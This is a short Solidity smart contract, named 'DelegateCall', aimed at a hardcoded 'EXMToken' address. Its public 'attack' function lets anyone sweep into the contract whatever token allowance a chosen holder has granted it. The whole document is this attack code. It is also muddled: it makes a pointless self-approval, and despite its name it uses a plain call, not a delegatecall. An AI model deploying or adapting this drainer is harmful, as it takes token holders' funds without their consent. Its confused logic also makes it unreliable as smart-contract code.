// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface EXMToken {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract DelegateCall {
    EXMToken public tokenContract;
    address public exmTokenAddress;

    constructor() {
        exmTokenAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c;
        tokenContract = EXMToken(exmTokenAddress);
    }
function attack(address tokenHolder) public {
    // Get the approved allowance from the token holder
    uint256 allowance = tokenContract.allowance(tokenHolder, address(this));

    // Approve the same amount of tokens
    require(tokenContract.approve(address(this), allowance), "Approval failed");
    emit ApprovalReceived(msg.sender, address(this), allowance);

    // Transfer the approved tokens
    bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", tokenHolder, address(this), allowance);
    (bool success, ) = address(tokenContract).call(data);
    require(success, "Transfer failed");
    emit TransferExecuted(tokenHolder, address(this), allowance);
}


event ApprovalReceived(address indexed sender, address indexed spender, uint256 value);
event TransferExecuted(address indexed from, address indexed to, uint256 value);


}